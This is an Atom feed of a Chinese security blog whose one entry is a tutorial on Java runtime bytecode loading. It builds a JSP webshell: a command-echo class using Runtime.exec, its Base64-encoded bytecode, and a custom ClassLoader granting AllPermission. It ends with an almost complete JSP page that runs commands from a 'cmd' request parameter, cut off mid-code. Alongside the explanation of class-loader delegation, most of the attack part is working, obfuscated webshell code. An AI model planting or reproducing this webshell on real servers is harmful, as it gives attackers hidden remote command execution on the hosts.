<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>h0ld1rs的博客</title>
  
  <subtitle>浊眼之外，满目皆是狼藉</subtitle>
  <link href="https://h0ld1rs.github.io/atom.xml" rel="self"/>
  
  <link href="https://h0ld1rs.github.io/"/>
  <updated>2022-03-12T16:19:25.539Z</updated>
  <id>https://h0ld1rs.github.io/</id>
  
  <author>
    <name>h0ld1rs</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>java字节码加载的相关笔记</title>
    <link href="https://h0ld1rs.github.io/posts/42607.html"/>
    <id>https://h0ld1rs.github.io/posts/42607.html</id>
    <published>2022-03-11T12:34:06.000Z</published>
    <updated>2022-03-12T16:19:25.539Z</updated>
    
    <content type="html"><![CDATA[<h1 id="java加载字节码的相关笔记"><a href="#java加载字节码的相关笔记" class="headerlink" title="java加载字节码的相关笔记"></a>java加载字节码的相关笔记</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在java安全很多情况下都需要加载字节码来实现，这个实现离不开类加载器，也就是<code>ClassLoader</code></p><p>在p神 《java安全漫谈13》中提到到动态加载字节码的方式，这里结合<code>4ra1n</code>师傅的文章做一个总结</p><h2 id="0x01-自定义类加载器"><a href="#0x01-自定义类加载器" class="headerlink" title="0x01 自定义类加载器"></a>0x01 自定义类加载器</h2><p>这里是用于加载<code>JSP Webshell</code>的讨论</p><p>首先有一个加载的恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ByteCodeEvil</span> &#123;</span><br><span class="line">    String res;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ByteCodeEvil</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 简单回显 Webshell</span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = bufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            stringBuilder.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        res = stringBuilder.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 回显</span></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将其编译为<code>Class</code>文件之后，还需要对其进行<code>Base64</code>编码，因为直接获取到的字节码是<code>byte[]</code>，为了避免在传输过程中的一些问题，我们选择将其转为<code>base64</code>编码</p><p>可以进行如下操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(ByteCodeEvil.class.getName());</span><br><span class="line">    <span class="type">byte</span>[] code = clazz.toBytecode();</span><br><span class="line">    <span class="type">String</span> <span class="variable">bytes</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(code);</span><br><span class="line">    System.out.println(bytes);</span><br></pre></td></tr></table></figure><blockquote><p>其中ClassPool属于<code>javassist</code>中的东西，我们需要导入依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;3.24.0-GA&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></blockquote><p>最后可以获得<code>Base64</code>加密后的字节码</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220311210525.png"></p><p>之后我们需要从自定义的类加载器中将类加载出来，然后进行命令的执行，同时<code>ClassLoader</code>无法在运行时直接加载字节码</p><p>我们开始定义类加载器，一共需要三步：</p><ol><li>编写继承ClassLoader的抽象类</li><li>重写findClass()方法和defineClass()方法</li><li>在findClass()方法中调用调用<code>defineClass()</code>方法</li></ol><p>根据loadClass方法，首先会判断类是否已经被加载了(1)，如果没有，就会调用<code>loadClass</code>去加载(2)，如果还是没有找到，会调用<code>findBootstrapClassOrNull</code>方法。如果没有重写该方法的情况，默认是抛出异常。如果重写了该方法，则会自定义加载(3)</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220311234629.png"></p><p>开始重写方法</p><ol><li><p>重写<code>loadClass</code>方法的代码如下，当我们加载的是指定名称的类时，就调用重写后的<code>findClass</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">if</span> (name.contains(<span class="string">&quot;ByteCodeEvil&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.loadClass(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>重写<code>findClass</code></p><blockquote><p>在<code>findClass</code>中，如果调用<code>defineClass</code>加载指定的恶意字节码，就会达到运行时加载字节码的效果.</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.defineClass(name, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.findClass(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>根据双亲委派机制完善<code>findClass</code></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220311233314.png"></p></li></ol><blockquote><p>双亲委派机制</p><p>在java的类加载中，首先会检查该类是否已经被加载，若没有被加载，则会委托父加载器进行装载，只有当父加载器无法加载时，才会调用自身的<code>findClass()</code>方法进行加载。这样避免了子加载器加载一些试图冒名顶替可信任类的不可靠类，也不会让子加载器去实现父加载器实现的加载工作</p><p>例如用户使用自定义加载器加载<code>java.lang.Object</code>类，实际上委派给<code>BootstrapClassLoader</code>加载器。如果用户使用自定义类加载器加载<code>java.lang.Exp</code>类，父类无法加载只能交给自定义类加载器。由于同在<code>java.lang</code>包下，所以<code>Exp</code>类可以访问其他类的<code>protected</code>属性，可能涉及到一些敏感信息</p><p>因此必须将这个类与可信任类的访问域隔离，JVM中为了避免这样的危险操作，只允许由同一个类加载器加载的同一包内的类之间互相访问，这样一个由同一个类加载器加载的并属于同一个包的多个类集合称为运行时包</p><p>类加载体系为不同类加载器加载的类提供不同的命名空间，同一命名空间内的类可以互相访问，不同命名空间的类不知道彼此的存在</p></blockquote><p>除了命名空间的访问隔离和双亲委派的受信类保护，类加载器体系还用保护域来定义代码在运行时可以获得的权限</p><blockquote><p>每个class文件均和一个代码来源相关联，这个代码来源(<code>java.security.CodeSource</code>)通过URL类成员<code>location</code>指向代码库和对该class文件进行签名的零个或多个证书对象的数组。class文件在进行代码认证的过程中可能经过多个证书签名，也可能没有进行签名</p><p>访问控制策略<code>Policy</code>对权限的授予是以<code>CodeSource</code>为基础进行的，每个<code>CodeSource</code>拥有若干个<code>Permission</code>，这些<code>Permission</code>对象会被具体地以其子类描述，并且和<code>CodeSource</code>相关联的<code>Permission</code>对象将被封装在<code>java.security.PermissionCollection</code>类的一个子类实例中，以描述该<code>CodeSource</code>所获取的权限</p><p>类加载器的实现可以通过将代码来源(<code>CodeSource</code>)即代码库和该class文件的所有签名者信息，传递给当前的<code>Policy</code>对象的<code>getPermissions()</code>方法，来查询该代码来源所拥有的权限集合<code>PermissionCollection</code>(在策略初始化时生成)，并以此构造一个保护域传递给<code>defineClass()</code>以此指定类的保护域</p></blockquote><p>在jdk自带的源码中<code>defineClass</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len,</span><br><span class="line">                                     ProtectionDomain protectionDomain)</span><br><span class="line">    <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">&#123;</span><br><span class="line">    protectionDomain = preDefineClass(name, protectionDomain);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进<code>PreDefineClass</code>可以看到当pd为空的时候，会返回默认的<code>defaultDomain</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> ProtectionDomain <span class="title function_">preDefineClass</span><span class="params">(String name,</span></span><br><span class="line"><span class="params">                                            ProtectionDomain pd)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pd == <span class="literal">null</span>) &#123;</span><br><span class="line">            pd = defaultDomain;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pd;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>再跟上默认的<code>defaultDomain</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">ProtectionDomain</span> <span class="variable">defaultDomain</span> <span class="operator">=</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ProtectionDomain</span>(<span class="keyword">new</span> <span class="title class_">CodeSource</span>(<span class="literal">null</span>, (Certificate[]) <span class="literal">null</span>),</span><br><span class="line">                         <span class="literal">null</span>, <span class="built_in">this</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>同时，因为我们要往入写恶意类执行命令，所以我们需要最高权限</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PermissionCollection</span> <span class="variable">pc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Permissions</span>();</span><br><span class="line">pc.add(<span class="keyword">new</span> <span class="title class_">AllPermission</span>());</span><br></pre></td></tr></table></figure><p>根据官方文档：The AllPermission is a permission that implies all other permissions</p><p>意味着该代码拥有全部的权限，也就是最高权限，也拥有<code>拥有</code>SocketPermission<code>和</code>FilePermission<code>这种敏感操作的权限</code></p><p>最后得到如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="type">PermissionCollection</span> <span class="variable">pc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Permissions</span>();</span><br><span class="line">        pc.add(<span class="keyword">new</span> <span class="title class_">AllPermission</span>());</span><br><span class="line">        <span class="type">ProtectionDomain</span> <span class="variable">protectionDomain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProtectionDomain</span>(<span class="keyword">new</span> <span class="title class_">CodeSource</span>(<span class="literal">null</span>, (java.security.cert.Certificate[]) <span class="literal">null</span>), pc, <span class="built_in">this</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.defineClass(name, bytes, <span class="number">0</span>, bytes.length, protectionDomain);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.findClass(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们放到<code>Test.java</code>试一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Evil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">                <span class="keyword">if</span>(name.contains(<span class="string">&quot;ByteCodeEvil&quot;</span>))&#123;</span><br><span class="line">                    <span class="keyword">return</span> findClass(name);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">super</span>.loadClass(name);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQATgoAEQAsBwAtCgACACwHAC4HAC8KADAAMQoAMAAyCgAzADQKAAUANQoABAA2CgAEADcKAAIAOAgAOQoAAgA6CQAQADsHADwHAD0BAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAF0xjb20vRXZpbC9CeXRlQ29kZUV2aWw7AQADY21kAQANc3RyaW5nQnVpbGRlcgEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAA5idWZmZXJlZFJlYWRlcgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBAA1TdGFja01hcFRhYmxlBwA8BwA+BwAtBwAuAQAKRXhjZXB0aW9ucwcAPwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAApTb3VyY2VGaWxlAQARQnl0ZUNvZGVFdmlsLmphdmEMABQAQAEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIHAEEMAEIAQwwARABFBwBGDABHAEgMABQASQwAFABKDABLACkMAEwATQEAAQoMACgAKQwAEgATAQAVY29tL0V2aWwvQnl0ZUNvZGVFdmlsAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQADKClWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEAEyhMamF2YS9pby9SZWFkZXI7KVYBAAhyZWFkTGluZQEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwAhABAAEQAAAAEAAAASABMAAAACAAEAFAAVAAIAFgAAANIABgAFAAAARyq3AAG7AAJZtwADTbsABFm7AAVZuAAGK7YAB7YACLcACbcACk4ttgALWToExgASLBkEtgAMEg22AAxXp//qKiy2AA61AA+xAAAAAwAXAAAAHgAHAAAACQAEAAsADAAMACUADgAvAA8APgARAEYAEgAYAAAANAAFAAAARwAZABoAAAAAAEcAGwATAAEADAA7ABwAHQACACUAIgAeAB8AAwAsABsAIAATAAQAIQAAABsAAv8AJQAEBwAiBwAjBwAkBwAlAAD8ABgHACMAJgAAAAQAAQAnAAEAKAApAAEAFgAAAC8AAQABAAAABSq0AA+wAAAAAgAXAAAABgABAAAAFwAYAAAADAABAAAABQAZABoAAAABACoAAAACACs=&quot;</span>);</span><br><span class="line">                    <span class="type">PermissionCollection</span> <span class="variable">pc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Permissions</span>();</span><br><span class="line">                    pc.add(<span class="keyword">new</span> <span class="title class_">AllPermission</span>());</span><br><span class="line">                    <span class="type">ProtectionDomain</span> <span class="variable">protectionDomain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProtectionDomain</span>(<span class="keyword">new</span> <span class="title class_">CodeSource</span>(<span class="literal">null</span>, (java.security.cert.Certificate[]) <span class="literal">null</span>), pc, <span class="built_in">this</span>, <span class="literal">null</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">this</span>.defineClass(name, bytes, <span class="number">0</span>, bytes.length, protectionDomain);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">super</span>.findClass(name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">        Class&lt;?&gt; clazz = loader.loadClass(<span class="string">&quot;com.Evil.ByteCodeEvil&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> constructor.newInstance(cmd).toString();</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>放入我们一开始生成的恶意类的字节码文件，用反射进行执行，最后使用jsp，替换输出为内置对象。就形成了一个jsp马</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Base64&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.security.cert.Certificate&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.security.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page pageEncoding=<span class="string">&quot;GB2312&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">            <span class="keyword">if</span>(name.contains(<span class="string">&quot;ByteCodeEvil&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">return</span> findClass(name);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.loadClass(name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQATgoAEQAsBwAtCgACACwHAC4HAC8KADAAMQoAMAAyCgAzADQKAAUANQoABAA2CgAEADcKAAIAOAgAOQoAAgA6CQAQADsHADwHAD0BAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAF0xjb20vRXZpbC9CeXRlQ29kZUV2aWw7AQADY21kAQANc3RyaW5nQnVpbGRlcgEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAA5idWZmZXJlZFJlYWRlcgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBAA1TdGFja01hcFRhYmxlBwA8BwA+BwAtBwAuAQAKRXhjZXB0aW9ucwcAPwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAApTb3VyY2VGaWxlAQARQnl0ZUNvZGVFdmlsLmphdmEMABQAQAEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIHAEEMAEIAQwwARABFBwBGDABHAEgMABQASQwAFABKDABLACkMAEwATQEAAQoMACgAKQwAEgATAQAVY29tL0V2aWwvQnl0ZUNvZGVFdmlsAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQADKClWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEAEyhMamF2YS9pby9SZWFkZXI7KVYBAAhyZWFkTGluZQEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwAhABAAEQAAAAEAAAASABMAAAACAAEAFAAVAAIAFgAAANIABgAFAAAARyq3AAG7AAJZtwADTbsABFm7AAVZuAAGK7YAB7YACLcACbcACk4ttgALWToExgASLBkEtgAMEg22AAxXp//qKiy2AA61AA+xAAAAAwAXAAAAHgAHAAAACQAEAAsADAAMACUADgAvAA8APgARAEYAEgAYAAAANAAFAAAARwAZABoAAAAAAEcAGwATAAEADAA7ABwAHQACACUAIgAeAB8AAwAsABsAIAATAAQAIQAAABsAAv8AJQAEBwAiBwAjBwAkBwAlAAD8ABgHACMAJgAAAAQAAQAnAAEAKAApAAEAFgAAAC8AAQABAAAABSq0AA+wAAAAAgAXAAAABgABAAAAFwAYAAAADAABAAAABQAZABoAAAABACoAAAACACs=&quot;</span>);</span><br><span class="line">                <span class="type">PermissionCollection</span> <span class="variable">pc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Permissions</span>();</span><br><span class="line">                pc.add(<span class="keyword">new</span> <span class="title class_">AllPermission</span>());</span><br><span class="line">                <span class="type">ProtectionDomain</span> <span class="variable">protectionDomain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProtectionDomain</span>(<span class="keyword">new</span> <span class="title class_">CodeSource</span>(<span class="literal">null</span>, (Certificate[]) <span class="literal">null</span>), pc, <span class="built_in">this</span>, <span class="literal">null</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.defineClass(name, bytes, <span class="number">0</span>, bytes.length, protectionDomain);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.findClass(name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    Class&lt;?&gt; clazz = loader.loadClass(<span class="string">&quot;com.Evil.ByteCodeEvil&quot;</span>);</span><br><span class="line">   